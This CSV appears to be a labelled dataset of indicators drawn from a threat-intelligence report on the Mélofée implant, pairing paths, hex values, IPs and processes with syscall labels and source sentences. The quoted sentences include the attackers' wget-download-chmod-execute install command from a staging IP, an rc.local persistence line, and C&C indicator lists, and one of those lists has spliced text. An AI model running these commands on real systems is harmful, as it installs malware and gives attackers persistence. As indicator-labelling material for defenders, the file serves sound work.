report,word,verb,objectType,prettyReg,match,label,asgSyscall,sentence
Melofee-exatrack.csv,/var/tmp/%s.lock,use,FILE,/tmp.*,0,0,,"There were however some common points between Mélofée and AlienReverse Both implants were developped in C++ Both implants used a file with a fixed ID in /var/tmp/%s.lock to ensure only one implant is running (this code was found in public 14, but seems rarely used in the wild) This implant implemented a similar mechanism for limiting working hours (defined as worktime) The command supported by this implant were the following: Command ID	Capability	Comment 0x110010	CmdBroadcast	Send encrypted data over the socket 0x110011	CmdOnRainUninstall	Unimplemented 0x110020	CmdOnline	Send local information such as hostname, date, and current UID to the server 0x110061	FileManager	Supports several subcommands such as OpenFile, CreateDir, FileEnum, FileDownload, … 0x110062	ScreenSnapshot	Unimplemented 0x110063	CmdOnTaskList	Unimplemented 0x110064	CmdOnShellCommand	Launch interactive shell 0x110065	CmdOnShellActive	Unimplemented 0x110066	CmdOnServiceList	Unimplemented 0x110068	CmdOnPortMapping	Launches EarthWorm to perform the port mapping, supporting a scanning mode with another AlienReverse implant used as a proxy"
Melofee-exatrack.csv,/var/tmp/installer,wget,FILE,/tmp.*,0,0,,"wget http://173.209.62.186:8765/installer -O /var/tmp/installer wget http://173.209.62.186:8765/a.dat -O /var/tmp/usbd; chmod +x /var/tmp/installer; /var/tmp/installer -i /var/tmp/usbd The installer is also developped in C++, and takes the binary package as an argument"
Melofee-exatrack.csv,/tmp/worktime,write,FILE,/tmp.*,0,0,,"Also implements the management of a Socks proxy 0x110073	CmdOnKbdRecord	Unimplemented 0x110075	CmdOnWorkTime	Writes the expected runtime hours in the file /tmp/worktime The packet format used by the communication protocol is very similar to the one used by Mélofée: struct AlienComzPacket {     unsigned int dwTickCount;     unsigned int dwMagic1; // 0xa003001     unsigned int dwMagic2; // 0x10000137, also used to indicate if the packet has data     unsigned int dwCommandID;     unsigned int dwTotalSize;     unsigned int dwEncryptedSize;     unsigned int ;     char []      data; // The data encrypted using pel_encrypt } While we initially thought that this sample was related to the Mélofée family, we came to the conclusion that it is a distinct tool"
Melofee-exatrack.csv,/tmp/%s.lock,sample_hash,FILE,/tmp.*,0,0,," Network IOCs IOC	Comment dgbyem.com	AlienReverse C&C domain update.ankining.com	Mélofée C&C subdomain www.data-yuzefuji.com	Mélofée C&C domain ssm.awszonwork.com	Mélofée C&C subdomain stock.awszonwork.com	CobaltStrike C&C subdomain help.git1ab.com	HelloBot C&C subdomain about.git1ab.com	StowAway and Winnti C&C subdomain www.git1ab.com	Unknown usage cloudf1are.com	CobaltStrike C&C domain, PlugX staging cdn.cloudf1are.com	HelloBot C&C subdomain cdn2.cloudf1are.com	C&C subdomain cdn3.cloudf1are.com	C&C subdomain cdn4.cloudf1are.com	C&C subdomain dns.cloudf1are.com	PlugX and Winnti C&C subdomain dns2.cloudf1are.com	Spark C&C subdomain, ToDesk staging dev.yuanta.dev	Probable Winnti C&C domain test.yuanta.dev	Probable Winnti C&C domain us.securitycloud-symantec.icu	Winnti C&C domain vt.livehost.live	Winnti C&C domain 156.67.208.192	Mélofée C&C IP 5.61.57.80	Mélofée C&C IP 147.139.28.254	AlienReverse C&C IP 173.209.62.186	Mélofée installer staging 173.209.62.187	C&C server 173.209.62.188	Mélofée C&C server and Winnti staging domain 173.209.62.189	C&C server 173.209.62.190	Mélofée C&C IP 167.172.73.202	CobaltStrike, * // The data encrypted using pel_encryptShadowPad and HelloBot C&C IP 47.243.51.98	StowAway C&C IP 185.145.128.90	CobaltStrike and PlugX C&C IP 103.87.10.100	toDesk staging 202.182.101.174	PlugX C&C IP 144.202.112.187	PlugX staging 38.54.30.39	Winnti C&C IP Yara rules rule UNK_APT_MelofeeImplant {     meta:         author = Exatrack         date =   2023-03-03         update =   2023-03-03         description = Detects the Melofee implant         tlp =  CLEAR         sample_hash = a5a4284f87fd475b9474626040d289ffabba1066fae6c37bd7de9dabaf65e87a,f3e35850ce20dfc731a6544b2194de3f35101ca51de4764b8629a692972bef68,8d855c28744dd6a9c0668ad9659baf06e5e448353f54d2f99beddd21b41390b7     strings:         $str_melofee_implant_01 = 10PipeSocket         $str_melofee_implant_02 = ikcp_ack_push         $str_melofee_implant_03 = TLSSocketEE         $str_melofee_implant_04 = /tmp/%s.lock         $str_melofee_implant_05 = neosmart::WaitForMultipleEvents         $str_melofee_implant_06 = 9TLSSocket         $str_melofee_implant_07 = 7VServer         $str_melofee_implant_08 = N5boost6detail13sp_ms_deleterI13UdpSocketWrapEE         $str_melofee_implant_09 = UdpServerWrap         $str_melofee_implant_10 = KcpUpdater         $str_melofee_implant_11 = SelfForwardServer         $str_command_parsing_01 = {3?"
Melofee-exatrack.csv,407ab8618fed74fdb5fd374f3ed4a2fd9e8ea85631be2787e2ad17200f0462b8,x32,FILE,407ab8618fed74fdb5fd374f3ed4a2fd9e8ea85631be2787e2ad17200f0462b8,0,0,," Annexes IOCs Hashes SHA256	FileType	Comment 3ca39774a4405537674673227940e306cf5e8cd8dfa1f5fc626869738a489c3d	Text file	Installation commands 758b0934b7adddb794951d15a6ddcace1fa523e814aa40b55e2d071cf2df81f0	ELF x64 executable	Installer a5a4284f87fd475b9474626040d289ffabba1066fae6c37bd7de9dabaf65e87a	ELF x64 executable	Implant version 20220111 2db4adf44b446cdd1989cbc139e67c068716fb76a460654791eef7a959627009	ELF x64 executable	Implant version 20220308 8d855c28744dd6a9c0668ad9659baf06e5e448353f54d2f99beddd21b41390b7	ELF x64 executable	Implant with rootkit and without version number f3e35850ce20dfc731a6544b2194de3f35101ca51de4764b8629a692972bef68	Binary file	Container of rootkit and implant probably used for installation 330a61fa666001be55db9e6f286e29cce4af7f79c6ae267975c19605a2146a21	PE x64 executable	Cobalt Strike beacon 7149cdb130e1a52862168856eae01791cc3d9632287f990d90da0cce1dc7c6b9	PE32 executable	Cobalt Strike beacon a62b67596640a3ebadd288e733f933ff581cc1822d6871351d82bd7472655bb5	ELF x64 executable	StowAway proxy tool 3535f45bbfafda863665c41d97d894c39277dfd9af1079581d28015f76669b88	ELF x64 executable	AlienReverse implant 2e62d6c47c00458da9338c990b095594eceb3994bf96812c329f8326041208e8	ELF x32 executable	HelloBot implant 407ab8618fed74fdb5fd374f3ed4a2fd9e8ea85631be2787e2ad17200f0462b8	ELF x32 executable	HelloBot implant 187b6a4c6bc379c183657d8eafc225da53ab8f78ac192704b713cc202cf89a17	ELF x32 executable	HelloBot implant 2801a3cc5aed8ecb391a9638a3c6f8db58ca3002e66f11bf88f8c7c2e5a6b009	ELF x32 executable	HelloBot implant 6e858c2c9ae20e3149cb0012ab9a24995aa331d2a818b127b2f517bc3aa745a0	PE x64 executable	Go downloader for toDesk 7684e1dfaeb2e7c8fd1c9bd65041b705bc92a87d9e11e327309f6c21b5e7ad97	PE x64 executable	Go downloader for toDesk 899ef7681982941b233e1ea3c1a6d5a4e90153bbb2809f70ee5f6fcece06cabc	PE x64 executable	Spark implant c36ab5108491f4969512f4d35e0d42b3d371033c8ccf03e700c60fb98d5a95f8	ELF x64	UPX Packed executable (probably NPS, to confirm) ad5bc6c4e653f88c451f6f6375516cc36a8fa03dd5a4d1412a418c91d4f9bec8	ASCII text file	Script dropped in /etc/rc.modules for rootkit persistance 1f9e4bfb25622eab6c33da7da9be6c51cf8bf1a284ee1c1703a3cee445bc8cd9	ELF x64 executable	Winnti Linux 22fd67457274635db7dd679782e002009363010db66523973b4748d5778b1a2a	ELF x64 executable	Winnti Linux 3c1842d29a3445bd3b85be486e49dba36b8b5ad55841c0ce00630cb83386881d	ELF x64 executable	Winnti Linux 5861584bb7fa46373c1b1f83b1e066a3d82e9c10ce87539ee1633ef0f567e743	ELF x64 executable	Winnti Linux rootkit 378acfdbcec039cfe7287faac184adf6ad525b201cf781db9082b784c9c75c99	Shell script	Winnti Linux rootkit installer 617f9add4c27f3bb91a32fee007cce01f5a51deaf42e75e6cec3e71afe2ba967	ELF x64 executable	Winnti Linux 69ff2f88c1f9007b80d591e9655cc61eaa4709ccd8b3aa6ec15e3aa46b9098bd	ELF x64 executable	Winnti Linux ad979716afbce85776251d51716aeb00665118fb350038d150c129256dd6fc5f	ELF x64 executable	Winnti Linux f49f1b2cc52623624fdd3d636056b8a80705f6456a3d5a676e3fb78749bdd281	ELF x64 executable	Winnti Linux 2c1a6fe08c8cbdc904809be4c12b520888da7f33123d1656a268780a9be45e20	ELF x64 executable	Winnti Linux rootkit (Azazel fork) a37661830859ca440d777af0bfa829b01d276bb1f81fe14b1485fa3c09f5f286	JavaScript file	ezXSS payload"
Melofee-exatrack.csv,UID,send,ID,^UID.*,0,0,,"There were however some common points between Mélofée and AlienReverse Both implants were developped in C++ Both implants used a file with a fixed ID in /var/tmp/%s.lock to ensure only one implant is running (this code was found in public 14, but seems rarely used in the wild) This implant implemented a similar mechanism for limiting working hours (defined as worktime) The command supported by this implant were the following: Command ID	Capability	Comment 0x110010	CmdBroadcast	Send encrypted data over the socket 0x110011	CmdOnRainUninstall	Unimplemented 0x110020	CmdOnline	Send local information such as hostname, date, and current UID to the server 0x110061	FileManager	Supports several subcommands such as OpenFile, CreateDir, FileEnum, FileDownload, … 0x110062	ScreenSnapshot	Unimplemented 0x110063	CmdOnTaskList	Unimplemented 0x110064	CmdOnShellCommand	Launch interactive shell 0x110065	CmdOnShellActive	Unimplemented 0x110066	CmdOnServiceList	Unimplemented 0x110068	CmdOnPortMapping	Launches EarthWorm to perform the port mapping, supporting a scanning mode with another AlienReverse implant used as a proxy"
Melofee-exatrack.csv,"UID,",,ID,^UID.*,0,0,,"The first two versions: Command ID	Capability	Comment 0x103	ping_back	Sent by the client 0x1	uninstall	Kill the current process and removes the persistance 0x2	update_and_relaunch	Overwrite the current running file and relaunch 0x3	launch_new_command_thread	Creates a new socket for interaction 0x4	write_file	 0x5	read_file	 0x6	launch_shell	 0x7	create_socket	0x0: TCP, 0x1: TLS, 0x2: UDP 0x10	send_local_information	Hostname, date, current UID, implant version number, … 0x50001	list_directory	 0x50002	create_directory Last version: Command ID	Capability	Comment 0x10005	reset_timer	 0x10002	clean_and_exit	 0x10004	create_socket	Create a bidirectional socket, probably used for proxying 0x40001	list_directory	 0x40002	delete_directory	Wrapper over system(rm -fr %s) 0x40003	rename	 0x40004	create_directory	 0x40005	write_file	 0x40006	read_file	 0x50001	exec_command_with_output	 0x70001	write_integer_to_file	Purpose unknown, probably used for sleeptime 0x60001	launch_shell	 0x90001	no_op	 Communication protocols The communication protocols have evolved in the three analyzed samples, however three socket types are implemented: TCPSocket (type 0x0) using raw TCP, with a custom packet format described below; TLSSocket (type 0x1), using a TLS encrypted channel to exchange with the C&C server; UDPSocket (type 0x2), using the KCP protocol 3 to send data"
Melofee-exatrack.csv,0x1,implement/set,MEM,"0x[0-9a-zA-Z]{1,16} (mem)",1,1,arch_prctl() mprotect() set_thread_area(),"The first two versions: Command ID	Capability	Comment 0x103	ping_back	Sent by the client 0x1	uninstall	Kill the current process and removes the persistance 0x2	update_and_relaunch	Overwrite the current running file and relaunch 0x3	launch_new_command_thread	Creates a new socket for interaction 0x4	write_file	 0x5	read_file	 0x6	launch_shell	 0x7	create_socket	0x0: TCP, 0x1: TLS, 0x2: UDP 0x10	send_local_information	Hostname, date, current UID, implant version number, … 0x50001	list_directory	 0x50002	create_directory Last version: Command ID	Capability	Comment 0x10005	reset_timer	 0x10002	clean_and_exit	 0x10004	create_socket	Create a bidirectional socket, probably used for proxying 0x40001	list_directory	 0x40002	delete_directory	Wrapper over system(rm -fr %s) 0x40003	rename	 0x40004	create_directory	 0x40005	write_file	 0x40006	read_file	 0x50001	exec_command_with_output	 0x70001	write_integer_to_file	Purpose unknown, probably used for sleeptime 0x60001	launch_shell	 0x90001	no_op	 Communication protocols The communication protocols have evolved in the three analyzed samples, however three socket types are implemented: TCPSocket (type 0x0) using raw TCP, with a custom packet format described below; TLSSocket (type 0x1), using a TLS encrypted channel to exchange with the C&C server; UDPSocket (type 0x2), using the KCP protocol 3 to send data"
Melofee-exatrack.csv,0x3,be,MEM,"0x[0-9a-zA-Z]{1,16} (mem)",0,0,,"It should be noted that the KCP protocol is a public communication library, and is also used in several malware families such as Amoeba 4 or CrossWalk 5; Some leftover code seems to indicate that there could be a third type 0x3 for HTTP based communications, but it was not implemented in the analyzed samples"
Melofee-exatrack.csv,0x3,relaunch,MEM,"0x[0-9a-zA-Z]{1,16} (mem)",0,0,,"The first two versions: Command ID	Capability	Comment 0x103	ping_back	Sent by the client 0x1	uninstall	Kill the current process and removes the persistance 0x2	update_and_relaunch	Overwrite the current running file and relaunch 0x3	launch_new_command_thread	Creates a new socket for interaction 0x4	write_file	 0x5	read_file	 0x6	launch_shell	 0x7	create_socket	0x0: TCP, 0x1: TLS, 0x2: UDP 0x10	send_local_information	Hostname, date, current UID, implant version number, … 0x50001	list_directory	 0x50002	create_directory Last version: Command ID	Capability	Comment 0x10005	reset_timer	 0x10002	clean_and_exit	 0x10004	create_socket	Create a bidirectional socket, probably used for proxying 0x40001	list_directory	 0x40002	delete_directory	Wrapper over system(rm -fr %s) 0x40003	rename	 0x40004	create_directory	 0x40005	write_file	 0x40006	read_file	 0x50001	exec_command_with_output	 0x70001	write_integer_to_file	Purpose unknown, probably used for sleeptime 0x60001	launch_shell	 0x90001	no_op	 Communication protocols The communication protocols have evolved in the three analyzed samples, however three socket types are implemented: TCPSocket (type 0x0) using raw TCP, with a custom packet format described below; TLSSocket (type 0x1), using a TLS encrypted channel to exchange with the C&C server; UDPSocket (type 0x2), using the KCP protocol 3 to send data"
Melofee-exatrack.csv,0xa003001,write,MEM,"0x[0-9a-zA-Z]{1,16} (mem)",0,0,,"Also implements the management of a Socks proxy 0x110073	CmdOnKbdRecord	Unimplemented 0x110075	CmdOnWorkTime	Writes the expected runtime hours in the file /tmp/worktime The packet format used by the communication protocol is very similar to the one used by Mélofée: struct AlienComzPacket {     unsigned int dwTickCount;     unsigned int dwMagic1; // 0xa003001     unsigned int dwMagic2; // 0x10000137, also used to indicate if the packet has data     unsigned int dwCommandID;     unsigned int dwTotalSize;     unsigned int dwEncryptedSize;     unsigned int ;     char []      data; // The data encrypted using pel_encrypt } While we initially thought that this sample was related to the Mélofée family, we came to the conclusion that it is a distinct tool"
Melofee-exatrack.csv,0x110061,support/change,MEM,"0x[0-9a-zA-Z]{1,16} (mem)",1,1,brk(),"There were however some common points between Mélofée and AlienReverse Both implants were developped in C++ Both implants used a file with a fixed ID in /var/tmp/%s.lock to ensure only one implant is running (this code was found in public 14, but seems rarely used in the wild) This implant implemented a similar mechanism for limiting working hours (defined as worktime) The command supported by this implant were the following: Command ID	Capability	Comment 0x110010	CmdBroadcast	Send encrypted data over the socket 0x110011	CmdOnRainUninstall	Unimplemented 0x110020	CmdOnline	Send local information such as hostname, date, and current UID to the server 0x110061	FileManager	Supports several subcommands such as OpenFile, CreateDir, FileEnum, FileDownload, … 0x110062	ScreenSnapshot	Unimplemented 0x110063	CmdOnTaskList	Unimplemented 0x110064	CmdOnShellCommand	Launch interactive shell 0x110065	CmdOnShellActive	Unimplemented 0x110066	CmdOnServiceList	Unimplemented 0x110068	CmdOnPortMapping	Launches EarthWorm to perform the port mapping, supporting a scanning mode with another AlienReverse implant used as a proxy"
Melofee-exatrack.csv,0xe0e0e0e,send,MEM,"0x[0-9a-zA-Z]{1,16} (mem)",0,0,,"The kernel rootkit expects the userland component to send a value of 0xe0e0e0e during the IOCTL call, with 2 commands supported (these two commands being hide and show)"
Melofee-exatrack.csv,0x60001,use/ummap,MEM,"0x[0-9a-zA-Z]{1,16} (mem)",1,1,munmap(),"The first two versions: Command ID	Capability	Comment 0x103	ping_back	Sent by the client 0x1	uninstall	Kill the current process and removes the persistance 0x2	update_and_relaunch	Overwrite the current running file and relaunch 0x3	launch_new_command_thread	Creates a new socket for interaction 0x4	write_file	 0x5	read_file	 0x6	launch_shell	 0x7	create_socket	0x0: TCP, 0x1: TLS, 0x2: UDP 0x10	send_local_information	Hostname, date, current UID, implant version number, … 0x50001	list_directory	 0x50002	create_directory Last version: Command ID	Capability	Comment 0x10005	reset_timer	 0x10002	clean_and_exit	 0x10004	create_socket	Create a bidirectional socket, probably used for proxying 0x40001	list_directory	 0x40002	delete_directory	Wrapper over system(rm -fr %s) 0x40003	rename	 0x40004	create_directory	 0x40005	write_file	 0x40006	read_file	 0x50001	exec_command_with_output	 0x70001	write_integer_to_file	Purpose unknown, probably used for sleeptime 0x60001	launch_shell	 0x90001	no_op	 Communication protocols The communication protocols have evolved in the three analyzed samples, however three socket types are implemented: TCPSocket (type 0x0) using raw TCP, with a custom packet format described below; TLSSocket (type 0x1), using a TLS encrypted channel to exchange with the C&C server; UDPSocket (type 0x2), using the KCP protocol 3 to send data"
Melofee-exatrack.csv,(0x43),,MEM,"0x[0-9a-zA-Z]{1,16} (mem)",0,0,,"The developper was also kind enough to includes an usage function describing the installer’s options: void usage(undefined8 param_1) {   printf(Usage: <%s> [options]\n,param_1);   puts(    -r                  Remove);   puts(    -i <data file>      Install);   puts(    -d                  Run in background);   puts(    -h                  Show help);   return; } Configuration management The configuration is encrypted using the RC4 algorithm in the two early samples, and with a simple xor with a single byte key (0x43) in the undated sample"
Melofee-exatrack.csv,0x429b7a,hide,MEM,"0x[0-9a-zA-Z]{1,16} (mem)",0,0,,"Some of the underlying code is also present in the two earlier samples (as documented by leftover RTTI information), and three types of server were available: TCPServer (type 0x00) TLServer (type 0x1) UDPServer (type 0x2) One interesting tidbit of this code is hidden in the receive function of the TLSServer (at address 0x429b7a in the undated sample)"
Melofee-exatrack.csv,0x110066,cmdonportmappe,MEM,"0x[0-9a-zA-Z]{1,16} (mem)",0,0,,"There were however some common points between Mélofée and AlienReverse Both implants were developped in C++ Both implants used a file with a fixed ID in /var/tmp/%s.lock to ensure only one implant is running (this code was found in public 14, but seems rarely used in the wild) This implant implemented a similar mechanism for limiting working hours (defined as worktime) The command supported by this implant were the following: Command ID	Capability	Comment 0x110010	CmdBroadcast	Send encrypted data over the socket 0x110011	CmdOnRainUninstall	Unimplemented 0x110020	CmdOnline	Send local information such as hostname, date, and current UID to the server 0x110061	FileManager	Supports several subcommands such as OpenFile, CreateDir, FileEnum, FileDownload, … 0x110062	ScreenSnapshot	Unimplemented 0x110063	CmdOnTaskList	Unimplemented 0x110064	CmdOnShellCommand	Launch interactive shell 0x110065	CmdOnShellActive	Unimplemented 0x110066	CmdOnServiceList	Unimplemented 0x110068	CmdOnPortMapping	Launches EarthWorm to perform the port mapping, supporting a scanning mode with another AlienReverse implant used as a proxy"
Melofee-exatrack.csv,0x4,create,MEM,"0x[0-9a-zA-Z]{1,16} (mem)",0,0,,"The first two versions: Command ID	Capability	Comment 0x103	ping_back	Sent by the client 0x1	uninstall	Kill the current process and removes the persistance 0x2	update_and_relaunch	Overwrite the current running file and relaunch 0x3	launch_new_command_thread	Creates a new socket for interaction 0x4	write_file	 0x5	read_file	 0x6	launch_shell	 0x7	create_socket	0x0: TCP, 0x1: TLS, 0x2: UDP 0x10	send_local_information	Hostname, date, current UID, implant version number, … 0x50001	list_directory	 0x50002	create_directory Last version: Command ID	Capability	Comment 0x10005	reset_timer	 0x10002	clean_and_exit	 0x10004	create_socket	Create a bidirectional socket, probably used for proxying 0x40001	list_directory	 0x40002	delete_directory	Wrapper over system(rm -fr %s) 0x40003	rename	 0x40004	create_directory	 0x40005	write_file	 0x40006	read_file	 0x50001	exec_command_with_output	 0x70001	write_integer_to_file	Purpose unknown, probably used for sleeptime 0x60001	launch_shell	 0x90001	no_op	 Communication protocols The communication protocols have evolved in the three analyzed samples, however three socket types are implemented: TCPSocket (type 0x0) using raw TCP, with a custom packet format described below; TLSSocket (type 0x1), using a TLS encrypted channel to exchange with the C&C server; UDPSocket (type 0x2), using the KCP protocol 3 to send data"
Melofee-exatrack.csv,--reverse-address=192.168.1.101:80,,NET,ip_addr/ip_addr:port/port,0,0,,$str_alien_14 = Example: ./AlienReverse --reverse-address=192.168.1.101:80 --reverse-password=123456         $str_alien_15 = Not during working hours!
Melofee-exatrack.csv,173.209.62.186,issue,NET,ip_addr/ip_addr:port/port,0,0,,Probable links with Winnti The response issued by the C&C server at the IP address 173.209.62.186 on the port 443 could be uniquely linked to another domain dev.yuanta.dev
Melofee-exatrack.csv,156.67.208.192,domain,NET,ip_addr/ip_addr:port/port,0,0,," Network IOCs IOC	Comment dgbyem.com	AlienReverse C&C domain update.ankining.com	Mélofée C&C subdomain www.data-yuzefuji.com	Mélofée C&C domain ssm.awszonwork.com	Mélofée C&C subdomain stock.awszonwork.com	CobaltStrike C&C subdomain help.git1ab.com	HelloBot C&C subdomain about.git1ab.com	StowAway and Winnti C&C subdomain www.git1ab.com	Unknown usage cloudf1are.com	CobaltStrike C&C domain, PlugX staging cdn.cloudf1are.com	HelloBot C&C subdomain cdn2.cloudf1are.com	C&C subdomain cdn3.cloudf1are.com	C&C subdomain cdn4.cloudf1are.com	C&C subdomain dns.cloudf1are.com	PlugX and Winnti C&C subdomain dns2.cloudf1are.com	Spark C&C subdomain, ToDesk staging dev.yuanta.dev	Probable Winnti C&C domain test.yuanta.dev	Probable Winnti C&C domain us.securitycloud-symantec.icu	Winnti C&C domain vt.livehost.live	Winnti C&C domain 156.67.208.192	Mélofée C&C IP 5.61.57.80	Mélofée C&C IP 147.139.28.254	AlienReverse C&C IP 173.209.62.186	Mélofée installer staging 173.209.62.187	C&C server 173.209.62.188	Mélofée C&C server and Winnti staging domain 173.209.62.189	C&C server 173.209.62.190	Mélofée C&C IP 167.172.73.202	CobaltStrike, * // The data encrypted using pel_encryptShadowPad and HelloBot C&C IP 47.243.51.98	StowAway C&C IP 185.145.128.90	CobaltStrike and PlugX C&C IP 103.87.10.100	toDesk staging 202.182.101.174	PlugX C&C IP 144.202.112.187	PlugX staging 38.54.30.39	Winnti C&C IP Yara rules rule UNK_APT_MelofeeImplant {     meta:         author = Exatrack         date =   2023-03-03         update =   2023-03-03         description = Detects the Melofee implant         tlp =  CLEAR         sample_hash = a5a4284f87fd475b9474626040d289ffabba1066fae6c37bd7de9dabaf65e87a,f3e35850ce20dfc731a6544b2194de3f35101ca51de4764b8629a692972bef68,8d855c28744dd6a9c0668ad9659baf06e5e448353f54d2f99beddd21b41390b7     strings:         $str_melofee_implant_01 = 10PipeSocket         $str_melofee_implant_02 = ikcp_ack_push         $str_melofee_implant_03 = TLSSocketEE         $str_melofee_implant_04 = /tmp/%s.lock         $str_melofee_implant_05 = neosmart::WaitForMultipleEvents         $str_melofee_implant_06 = 9TLSSocket         $str_melofee_implant_07 = 7VServer         $str_melofee_implant_08 = N5boost6detail13sp_ms_deleterI13UdpSocketWrapEE         $str_melofee_implant_09 = UdpServerWrap         $str_melofee_implant_10 = KcpUpdater         $str_melofee_implant_11 = SelfForwardServer         $str_command_parsing_01 = {3?"
Melofee-exatrack.csv,http://173.209.62.186:8765/installer,wget,NET,ip_addr/ip_addr:port/port,1,1,send(),"wget http://173.209.62.186:8765/installer -O /var/tmp/installer wget http://173.209.62.186:8765/a.dat -O /var/tmp/usbd; chmod +x /var/tmp/installer; /var/tmp/installer -i /var/tmp/usbd The installer is also developped in C++, and takes the binary package as an argument"
Melofee-exatrack.csv,http://173.209.62.186:8765/installer,wget,NET,ip_addr/ip_addr:port/port,1,1,send(),"wget http://173.209.62.186:8765/installer -O /var/tmp/installer wget http://173.209.62.186:8765/a.dat -O /var/tmp/usbd; chmod +x /var/tmp/installer; /var/tmp/installer -i /var/tmp/usbd The installer is also developped in C++, and takes the binary package as an argument"
Melofee-exatrack.csv,147.139.28.254,stage,NET,ip_addr/ip_addr:port/port,0,0,," Network IOCs IOC	Comment dgbyem.com	AlienReverse C&C domain update.ankining.com	Mélofée C&C subdomain www.data-yuzefuji.com	Mélofée C&C domain ssm.awszonwork.com	Mélofée C&C subdomain stock.awszonwork.com	CobaltStrike C&C subdomain help.git1ab.com	HelloBot C&C subdomain about.git1ab.com	StowAway and Winnti C&C subdomain www.git1ab.com	Unknown usage cloudf1are.com	CobaltStrike C&C domain, PlugX staging cdn.cloudf1are.com	HelloBot C&C subdomain cdn2.cloudf1are.com	C&C subdomain cdn3.cloudf1are.com	C&C subdomain cdn4.cloudf1are.com	C&C subdomain dns.cloudf1are.com	PlugX and Winnti C&C subdomain dns2.cloudf1are.com	Spark C&C subdomain, ToDesk staging dev.yuanta.dev	Probable Winnti C&C domain test.yuanta.dev	Probable Winnti C&C domain us.securitycloud-symantec.icu	Winnti C&C domain vt.livehost.live	Winnti C&C domain 156.67.208.192	Mélofée C&C IP 5.61.57.80	Mélofée C&C IP 147.139.28.254	AlienReverse C&C IP 173.209.62.186	Mélofée installer staging 173.209.62.187	C&C server 173.209.62.188	Mélofée C&C server and Winnti staging domain 173.209.62.189	C&C server 173.209.62.190	Mélofée C&C IP 167.172.73.202	CobaltStrike, * // The data encrypted using pel_encryptShadowPad and HelloBot C&C IP 47.243.51.98	StowAway C&C IP 185.145.128.90	CobaltStrike and PlugX C&C IP 103.87.10.100	toDesk staging 202.182.101.174	PlugX C&C IP 144.202.112.187	PlugX staging 38.54.30.39	Winnti C&C IP Yara rules rule UNK_APT_MelofeeImplant {     meta:         author = Exatrack         date =   2023-03-03         update =   2023-03-03         description = Detects the Melofee implant         tlp =  CLEAR         sample_hash = a5a4284f87fd475b9474626040d289ffabba1066fae6c37bd7de9dabaf65e87a,f3e35850ce20dfc731a6544b2194de3f35101ca51de4764b8629a692972bef68,8d855c28744dd6a9c0668ad9659baf06e5e448353f54d2f99beddd21b41390b7     strings:         $str_melofee_implant_01 = 10PipeSocket         $str_melofee_implant_02 = ikcp_ack_push         $str_melofee_implant_03 = TLSSocketEE         $str_melofee_implant_04 = /tmp/%s.lock         $str_melofee_implant_05 = neosmart::WaitForMultipleEvents         $str_melofee_implant_06 = 9TLSSocket         $str_melofee_implant_07 = 7VServer         $str_melofee_implant_08 = N5boost6detail13sp_ms_deleterI13UdpSocketWrapEE         $str_melofee_implant_09 = UdpServerWrap         $str_melofee_implant_10 = KcpUpdater         $str_melofee_implant_11 = SelfForwardServer         $str_command_parsing_01 = {3?"
Melofee-exatrack.csv,47.243.51.98,use,NET,ip_addr/ip_addr:port/port,0,0,," Network IOCs IOC	Comment dgbyem.com	AlienReverse C&C domain update.ankining.com	Mélofée C&C subdomain www.data-yuzefuji.com	Mélofée C&C domain ssm.awszonwork.com	Mélofée C&C subdomain stock.awszonwork.com	CobaltStrike C&C subdomain help.git1ab.com	HelloBot C&C subdomain about.git1ab.com	StowAway and Winnti C&C subdomain www.git1ab.com	Unknown usage cloudf1are.com	CobaltStrike C&C domain, PlugX staging cdn.cloudf1are.com	HelloBot C&C subdomain cdn2.cloudf1are.com	C&C subdomain cdn3.cloudf1are.com	C&C subdomain cdn4.cloudf1are.com	C&C subdomain dns.cloudf1are.com	PlugX and Winnti C&C subdomain dns2.cloudf1are.com	Spark C&C subdomain, ToDesk staging dev.yuanta.dev	Probable Winnti C&C domain test.yuanta.dev	Probable Winnti C&C domain us.securitycloud-symantec.icu	Winnti C&C domain vt.livehost.live	Winnti C&C domain 156.67.208.192	Mélofée C&C IP 5.61.57.80	Mélofée C&C IP 147.139.28.254	AlienReverse C&C IP 173.209.62.186	Mélofée installer staging 173.209.62.187	C&C server 173.209.62.188	Mélofée C&C server and Winnti staging domain 173.209.62.189	C&C server 173.209.62.190	Mélofée C&C IP 167.172.73.202	CobaltStrike, * // The data encrypted using pel_encryptShadowPad and HelloBot C&C IP 47.243.51.98	StowAway C&C IP 185.145.128.90	CobaltStrike and PlugX C&C IP 103.87.10.100	toDesk staging 202.182.101.174	PlugX C&C IP 144.202.112.187	PlugX staging 38.54.30.39	Winnti C&C IP Yara rules rule UNK_APT_MelofeeImplant {     meta:         author = Exatrack         date =   2023-03-03         update =   2023-03-03         description = Detects the Melofee implant         tlp =  CLEAR         sample_hash = a5a4284f87fd475b9474626040d289ffabba1066fae6c37bd7de9dabaf65e87a,f3e35850ce20dfc731a6544b2194de3f35101ca51de4764b8629a692972bef68,8d855c28744dd6a9c0668ad9659baf06e5e448353f54d2f99beddd21b41390b7     strings:         $str_melofee_implant_01 = 10PipeSocket         $str_melofee_implant_02 = ikcp_ack_push         $str_melofee_implant_03 = TLSSocketEE         $str_melofee_implant_04 = /tmp/%s.lock         $str_melofee_implant_05 = neosmart::WaitForMultipleEvents         $str_melofee_implant_06 = 9TLSSocket         $str_melofee_implant_07 = 7VServer         $str_melofee_implant_08 = N5boost6detail13sp_ms_deleterI13UdpSocketWrapEE         $str_melofee_implant_09 = UdpServerWrap         $str_melofee_implant_10 = KcpUpdater         $str_melofee_implant_11 = SelfForwardServer         $str_command_parsing_01 = {3?"
Melofee-exatrack.csv,--reverse-address=192.168.1.101:80,,NET,ip_addr/ip_addr:port/port,0,0,,$str_alien_14 = Example: ./AlienReverse --reverse-address=192.168.1.101:80 --reverse-password=123456         $str_alien_15 = Not during working hours!
Melofee-exatrack.csv,sh,try,PROC,^sh$,0,0,,"If it runs as the root user, it tries to write a line containing sh -c IMPLANT_EXECUTABLE_NAME >/dev/null 2>& in the files /etc/rc.local or /etc/rc.d/rc.local"
